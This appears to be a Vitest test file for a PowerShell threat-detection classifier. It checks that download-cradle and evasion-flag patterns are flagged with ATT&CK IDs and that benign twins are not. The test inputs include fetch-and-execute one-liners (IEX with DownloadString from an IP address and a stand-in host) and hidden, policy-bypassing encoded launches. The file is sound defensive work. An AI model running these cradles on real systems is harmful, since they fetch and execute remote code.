import { describe, expect, it } from 'vitest'
import { buildContext, classify } from '../techniques'
import { preprocess } from '../preprocess'

function analyze(text: string, raw = text) {
  return classify(buildContext(text, preprocess(raw).flags))
}
const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
const specOf = (text: string, id: string, raw = text) =>
  analyze(text, raw).find((s) => s.id === id)?.specificity

describe('download cradle', () => {
  it('fires when fetched content flows into an interpreter', () => {
    const sigs = analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    const c = sigs.find((s) => s.id === 'download-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toContain('T1105')
    expect(c!.trigger).toBeTruthy()
  })

  it('benign twin: download to a FILE (no IEX sink) does NOT fire', () => {
    expect(ids("Invoke-WebRequest https://example.com/data.json -OutFile data.json"))
      .not.toContain('download-cradle')
  })
})

describe('evasion-flag clustering', () => {
  it('fires on a 3+ evasion-flag cluster carrying an -enc payload', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc SQBFAFgA"
    expect(ids('IEX $x', raw)).toContain('evasion-cluster')
  })

  it('benign twin: evasion cluster running a LOCAL -File script does NOT fire', () => {
    const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
    expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
  })

  it('the -File discriminator is load-bearing: the same cluster+payload fires, and a -File in the corpus suppresses it', () => {
    const raw = 'powershell -nop -w hidden -ep bypass' // 3-flag cluster, no -File
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    // cluster>=3 AND payload (fetch+IEX sink) AND no -File -> fires
    expect(ids(payload, raw)).toContain('evasion-cluster')
    // same cluster+payload, but a -File mention in the corpus -> localFile suppresses it
    expect(ids('-File C:\\ops\\job.ps1 ; ' + payload, raw)).not.toContain('evasion-cluster')
  })
})

describe('co-occurrence upgrade', () => {
  it('bumps evasion-cluster weak -> strong when a download cradle co-fires', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc AAAA"
    const script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(specOf(script, 'evasion-cluster', raw)).toBe('strong')
  })
})

describe('determinism / ordering', () => {
  it('returns signals in a stable rule order', () => {
    const a = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    const b = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(a).toEqual(b)
  })
})
